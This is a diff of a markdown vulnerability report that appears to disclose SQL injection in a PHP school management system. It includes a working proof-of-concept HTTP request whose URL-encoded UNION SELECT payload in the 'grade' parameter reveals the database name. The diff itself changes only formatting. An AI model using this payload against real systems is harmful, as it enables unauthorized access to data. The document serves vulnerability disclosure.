@@ -18,7 +18,7 @@
 
 **Current database name:** std_db, length is 6
 
-**Request package：**select all students whose grade is specified
+**Request package**：select all students whose grade is specified
 
 ```
 GET /school/view/student_grade_wise.php?grade=11'%20union%20select%20database()%2c2%2c3%3b%23 HTTP/1.1
@@ -32,6 +32,6 @@ Cookie: PHPSESSID=cp26rmntdlbhle8qiofns95sv7
 Connection: close
 ```
 
-**SQL injection result：**line 6 database name is displayed.
+**SQL injection result**：line 6 database name is displayed.
 
 ![image-20220624163833913](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/sql_injection.assets/image-20220624163833913.png)
